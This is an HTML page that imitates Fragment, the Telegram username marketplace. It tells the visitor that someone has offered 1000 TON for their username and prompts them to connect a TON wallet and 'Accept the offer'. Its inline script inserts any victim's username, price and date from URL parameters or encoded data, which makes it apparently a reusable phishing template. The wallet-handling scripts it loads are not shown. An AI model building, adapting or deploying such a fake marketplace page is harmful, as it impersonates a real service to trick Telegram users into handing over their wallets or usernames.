<!doctype html>
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
 
<head>
    <meta charset="utf-8" />
    <title id="page-title">Fragment</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="format-detection" content="telephone=no" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="MobileOptimized" content="176" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="twitter:card" content="summary" />
 
    <link rel="shortcut icon" href="https://fragment.com/img/fragment.ico" type="image/x-icon" />
    <link rel="mask-icon" href="https://fragment.com/img/fragment_icon.svg" color="#121519" />
 
    <link href="../css/font-roboto.css" rel="stylesheet" type="text/css" />
    <link href="../css/bootstrap.min.css" rel="stylesheet" />
    <link href="../css/bootstrap-extra.css" rel="stylesheet" />
    <link href="../css/auction.css" rel="stylesheet" />
 
    <script src="../js/address.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
</head>
 
<body class="emoji_image no-transition">
    <svg xmlns="http://www.w3.org/2000/svg" style="display: none">
        <defs>
            <path id="icon-premium" d="m8.88 13.45 2.89-5.71c.33-.66 1.14-.93 1.8-.6.25.13.46.35.59.61l2.73 5.51c.22.45.66.76 1.16.82l5.7.68c.78.09 1.33.79 1.24 1.57-.04.31-.18.61-.41.84l-4.52 4.42c-.18.18-.27.43-.23.68l.75 5.98c.1.85-.5 1.63-1.36 1.74-.32.04-.65-.02-.94-.18l-4.77-2.59c-.34-.19-.76-.19-1.11-.01l-4.93 2.52c-.7.35-1.55.07-1.91-.62-.13-.26-.18-.55-.14-.84l.4-2.74c.19-1.34 1.03-2.51 2.23-3.12l5.49-2.78c.15-.08.2-.26.13-.4-.06-.12-.18-.18-.31-.16l-6.71.95c-1.02.15-2.06-.14-2.87-.79l-2.23-1.82c-.64-.51-.73-1.45-.22-2.09.24-.29.59-.48.97-.53l5.73-.74c.36-.04.68-.27.85-.6z" />
            <path id="icon-ton-qr" d="m4.02 7h15.945c.33 0 .6.27.6.615 0 .105-.015.21-.075.3l-7.56 13.62c-.33.6-1.08.81-1.665.48-.21-.12-.375-.285-.48-.495l-7.305-13.62c-.15-.3-.045-.675.255-.825.09-.045.18-.075.285-.075zm7.98 14.67v-14.67z" fill="none" stroke="currentColor" stroke-width="2.1" />
        </defs>
    </svg>
    <div id="aj_progress" class="progress-bar"></div>
 
    <div id="aj_content">
        <header class="tm-header">
            <div class="tm-header-logo">
                <a href="https://fragment.com/" class="tm-logo js-header-logo js-logo js-random-logo js-logo-hoverable">
                    <i class="tm-logo-icon js-logo-icon"></i>
                    <i class="tm-logo-text"></i>
                </a>
            </div>
            <div class="tm-header-body">
                <form action="https://fragment.com/" class="tm-header-search-form">
                    <div class="icon-before icon-search tm-field tm-search-field">
                        <input type="search" class="form-control tm-input tm-search-input" name="query" placeholder="Search usernames" autocomplete="off" />
                    </div>
                </form>
            </div>
            <div class="tm-header-actions tm-header-actions-wide">
                <button class="btn btn-primary tm-header-action tm-header-button ton-auth-link" id="ton-connect-button" style="display: none">
                    <i class="icon icon-connect-ton"></i>
                    <span class="tm-button-label">Connect TON</span>
                </button>
                <div class="btn-group tm-header-action tm-dropdown" id="ton-connected-dropdown" style="display: none">
                    <button class="btn btn-default tm-header-button dropdown-toggle" data-toggle="dropdown">
                        <i class="icon icon-connect-ton"></i>
                        <span class="tm-button-label opt-fixed-width">
                            <span class="tm-wallet">
                                <span class="head" id="wallet-head"></span>
                                <span class="middle"></span>
                                <span class="tail" id="wallet-tail"></span>
                            </span>
                        </span>
                    </button>
                    <ul class="dropdown-menu">
                        <li>
                            <a href="/my/assets" class="dropdown-menu-item icon-before icon-menu-assets" data-counter="">My Assets</a>
                        </li>
                        <li>
                            <a href="/my/bids" class="dropdown-menu-item icon-before icon-menu-bids" data-counter="">My Bids</a>
                        </li>
                        <li>
                            <a href="/my/numbers" class="dropdown-menu-item icon-before icon-menu-numbers" data-counter="">My Numbers</a>
                        </li>
                        <li>
                            <a href="/my/sessions" class="dropdown-menu-item icon-before icon-menu-sessions">Active Sessions</a>
                        </li>
                        <li>
                            <a href="javascript:;" class="dropdown-menu-item icon-before icon-menu-disconnect ton-logout-link">Log Out</a>
                        </li>
                    </ul>
                </div>
            </div>
 
            <div class="tm-header-menu-button js-header-menu-button icon-before icon-header-menu"></div>
            <div class="tm-header-menu hide js-header-menu" data-close-outside="js-header-menu-window">
                <div class="tm-header-menu-close-button js-header-menu-close-button icon-before icon-header-menu-close"></div>
                <div class="tm-header-menu-window js-header-menu-window">
                    <div class="tm-header-menu-body">
                        <h4 class="tm-menu-subheader">Platform</h4>
                        <div class="tm-menu-links">
                            <a href="https://fragment.com/about" class="tm-menu-link icon-before icon-menu-about">About</a>
                            <a href="https://fragment.com/terms" class="tm-menu-link icon-before icon-menu-terms">Terms</a>
                            <a href="https://fragment.com/privacy" class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
                        </div>
                        <div class="tm-header-menu-footer">
                            <div class="tm-header-menu-footer-text">
                                Connect TON <br />to view your bids and
                                assets
                            </div>
                            <button class="btn btn-primary btn-block tm-menu-button ton-auth-link">
                                <i class="icon icon-connect-ton"></i>
                                <span class="tm-button-label">Connect TON</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </header>
        <main class="tm-main js-main-content">
            <section class="tm-section tm-auction-section">
                <div class="tm-section-header">
                    <h2 class="tm-section-header-text">
                        <span class="tm-section-header-domain">
                            <span class="tm-web3-address">
                                <span class="subdomain" id="username-display">imightbemilo</span>
                                <span class="domain">.t.me</span>
                            </span>
                        </span>
                        <span class="tm-section-header-status tm-status-avail">Claimed</span>
                    </h2>
                    <div class="tm-section-subscribe tm-section-box js-subscribe">
                        <a class="btn-link subscribe-btn js-subscribe-btn">Subscribe to updates</a>
                        <a class="btn-link unsubscribe-btn js-unsubscribe-btn">Unsubscribe from updates</a>
                    </div>
                </div>
 
                <div class="tm-section-box tm-section-bid-info">
                    <table class="table tm-table tm-table-fixed">
                        <thead>
                            <tr>
                                <th>What is this?</th>
                            </tr>
                        </thead>
                    </table>
                    <div class="tm-bid-info-text tm-offer-info-text">
                        Someone offered
                        <span class="icon-before icon-ton" id="offer-amount">1000</span>
                        for your username. If the price suits you, press
                        "Accept the offer".
                        <a href="https://fragment.com/about" class="tm-nowrap js-howofferworks"><br />How does this work?</a>
                    </div>
                </div>
                <div class="tm-list tm-section-box tm-section-auction-info">
                    <dl class="tm-list-item">
                        <dt class="tm-list-item-title">
                            Telegram Username
                        </dt>
                        <dd class="tm-list-item-value">
                            <span class="accent-color" id="telegram-username">@imightbemilo</span>
                        </dd>
                    </dl>
                    <dl class="tm-list-item">
                        <dt class="tm-list-item-title">Web Address</dt>
                        <dd class="tm-list-item-value">
                            <span class="accent-color" id="web-address">t.me/imightbemilo</span>
                        </dd>
                    </dl>
                    <dl class="tm-list-item">
                        <dt class="tm-list-item-title">
                            TON Web 3.0 Address
                        </dt>
                        <dd class="tm-list-item-value">
                            <span class="accent-color"><span class="tm-web3-address"><span class="subdomain" id="ton-username"> imightbemilo </span><span class="domain">.t.me</span></span>
                            </span>
                        </dd>
                    </dl>
                </div>
                <div class="tm-section-box tm-section-buttons js-actions" data-username="user" data-item-title="@user">
                    <button class="btn btn-primary js-make-offer-btn" id="accept-offer">
                        <span class="tm-button-label">Accept the offer</span>
                    </button>
                </div>
            </section>
            <section class="tm-section clearfix">
                <div class="tm-section-header">
                    <h3 class="tm-section-header-text">Latest Offers</h3>
                </div>
                <div class="tm-table-wrap">
                    <table class="table tm-table tm-table-fixed">
                        <thead>
                            <tr>
                                <th style="
                                            --thin-width: 100px;
                                            --wide-width: 25%;
                                        ">
                                    Offer
                                </th>
                                <th style="
                                            --thin-width: 110px;
                                            --wide-width: 25%;
                                        ">
                                    Date
                                </th>
                                <th style="--width: 50%; text-align: left; padding-left: 30px;">
    Offered by
</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>
                                    <div class="table-cell">
                                        <div class="table-cell-value tm-value icon-before icon-ton" id="table-offer-amount">
                                            1000
                                        </div>
                                    </div>
                                </td>
                                <td>
                                    <div class="table-cell">
                                        <div class="tm-datetime" id="offer-date">
                                            19 Aug 2025 at 16:52
                                        </div>
                                    </div>
                                </td>
                                <td>
                                    <div class="table-cell">
                                        <a href="https://tonviewer.com/UQDm89iCT0ax77q5r8aEeTQoxV_tabRqFaSb5popvEnlMO6e" class="tm-wallet" target="_blank">
                                            <span class="head">UQDm89iCT0ax77q5r8aEeTQo</span>
                                            <span class="middle"></span>
                                            <span class="tail">xV_tabRqFaSb5popvEnlMO6e</span>
                                        </a>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>
        </main>
        <div class="popup-container hide js-howitworks-popup" data-close-outside="popup-body">
            <div class="popup">
                <div class="popup-body">
                    <section>
                        <h4>How does this work?</h4>
                        <p class="popup-text">
                            You can buy this
                            <a href="https://fragment.com/about#what-is-a-collectible">collectible username</a>
                            and use it for your <b>personal profile</b>,
                            group or channel.<br />
                            <br /><b>To do so, simply:</b><br />• Get
                            <a href="https://tonkeeper.com/">Tonkeeper</a>,
                            open it and create a <b>wallet</b>.<br />•
                            Deposit funds in your <b>wallet</b> from a
                            <a href="https://ton.org/buy-toncoin">supported exchange</a>
                            or with
                            <a href="https://wallet.t.me/">@wallet</a> on
                            Telegram.<br />• Use <b>Tonkeeper</b> to log in
                            on Fragment and return to this page.<br />• Tap
                            the buttons below to join the auction.<br /><br />Purchased
                            entities become available under My Assets and
                            can be used within any supported platform,
                            starting with Telegram.<br /><br /><a href="https://fragment.com/about">Learn More</a>
                        </p>
                        <div class="popup-buttons">
                            <a class="btn btn-link btn-lg popup-cancel-btn">Close</a>
                        </div>
                    </section>
                </div>
            </div>
        </div>
        <footer class="tm-footer">
            <div class="tm-footer-links">
                <a href="https://fragment.com/" class="tm-footer-link">Top Auctions</a>
                <a href="https://fragment.com/about" class="tm-footer-link">About</a>
                <a href="https://fragment.com/terms" class="tm-footer-link">Terms</a>
                <a href="https://fragment.com/privacy" class="tm-footer-link">Privacy</a>
            </div>
        </footer>
    </div>
    
    <script>
        // Function to decode Base64 URL-safe
        function base64UrlDecode(str) {
            // Add padding if needed
            str += '='.repeat((4 - str.length % 4) % 4);
            // Replace URL-safe characters
            str = str.replace(/-/g, '+').replace(/_/g, '/');
            try {
                return atob(str);
            } catch (e) {
                console.error('Failed to decode base64:', e);
                return null;
            }
        }

        // Function to parse Telegram initData
        function parseTelegramInitData(initData) {
            try {
                const decoded = base64UrlDecode(initData);
                if (!decoded) return null;
                
                // Try to parse as JSON first
                try {
                    return JSON.parse(decoded);
                } catch (e) {
                    // If not JSON, try to parse as URL parameters
                    const params = new URLSearchParams(decoded);
                    const result = {};
                    for (const [key, value] of params.entries()) {
                        result[key] = value;
                    }
                    return result;
                }
            } catch (e) {
                console.error('Failed to parse initData:', e);
                return null;
            }
        }

        // Function to format timestamp to readable date
        function formatTimestamp(timestamp) {
            try {
                // Handle both seconds and milliseconds timestamps
                const ts = timestamp.toString().length <= 10 ? parseInt(timestamp) * 1000 : parseInt(timestamp);
                const date = new Date(ts);
                
                // Check if date is valid
                if (isNaN(date.getTime())) {
                    console.error('Invalid timestamp:', timestamp);
                    return 'Invalid date';
                }
                
                const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 
                               'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
                
                const day = date.getDate();
                const month = months[date.getMonth()];
                const year = date.getFullYear();
                const hours = date.getHours().toString().padStart(2, '0');
                const minutes = date.getMinutes().toString().padStart(2, '0');
                
                return `${day} ${month} ${year} at ${hours}:${minutes}`;
            } catch (e) {
                console.error('Failed to format timestamp:', e);
                return 'Invalid date';
            }
        }

        // Function to update page with parameters
        function updatePageWithParams(params) {
            const username = params.username || params.user || 'imightbemilo';
            const price = params.price || params.amount || params.offer || '1000';
            const timestamp = params.timestamp || params.date || params.ts;

            // Update username in all locations
            document.getElementById('username-display').textContent = username;
            document.getElementById('telegram-username').textContent = '@' + username;
            document.getElementById('web-address').textContent = 't.me/' + username;
            document.getElementById('ton-username').textContent = ' ' + username + ' ';
            document.title = username + ' – Fragment';

            // Update price in all locations
            document.getElementById('offer-amount').textContent = price;
            document.getElementById('table-offer-amount').textContent = price;

            // Update timestamp if provided
            if (timestamp) {
                const formattedDate = formatTimestamp(timestamp);
                document.getElementById('offer-date').textContent = formattedDate;
            }

            // Update actions data attributes
            const actionsElement = document.querySelector('.js-actions');
            if (actionsElement) {
                actionsElement.setAttribute('data-username', username);
                actionsElement.setAttribute('data-item-title', '@' + username);
            }

            console.log('Page updated with params:', { username, price, timestamp });
        }

        // Main initialization function
        function initializePage() {
            const urlParams = new URLSearchParams(window.location.search);
            let params = {};

            // Check for direct URL parameters first
            if (urlParams.has('username') || urlParams.has('price') || urlParams.has('timestamp')) {
                params.username = urlParams.get('username');
                params.price = urlParams.get('price');
                params.timestamp = urlParams.get('timestamp');
            }
            
            // Check for Telegram initData parameter
            else if (urlParams.has('tgWebAppData') || urlParams.has('initData')) {
                const initData = urlParams.get('tgWebAppData') || urlParams.get('initData');
                const parsedData = parseTelegramInitData(initData);
                if (parsedData) {
                    params = { ...params, ...parsedData };
                }
            }
            
            // Check for base64 encoded data parameter
            else if (urlParams.has('data')) {
                const encodedData = urlParams.get('data');
                const parsedData = parseTelegramInitData(encodedData);
                if (parsedData) {
                    params = { ...params, ...parsedData };
                }
            }

            // Update page with parameters (will use defaults if none provided)
            updatePageWithParams(params);
        }

        // Initialize when DOM is loaded
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initializePage);
        } else {
            initializePage();
        }

        // Also listen for hash changes in case parameters are passed that way
        window.addEventListener('hashchange', initializePage);

        // Debug function to test with sample data
        window.testWithSampleData = function() {
            const sampleParams = {
                username: 'testuser',
                price: '2500',
                timestamp: '1692454320' // This should show: 19 Aug 2023 at 15:12
            };
            updatePageWithParams(sampleParams);
            console.log('Updated with sample data - timestamp should show as formatted date');
        };

        console.log('Fragment username offer page initialized. Use testWithSampleData() to test with sample data.');
    </script>
    <script src="../js/connect.js"></script>
</body>
 
</html>
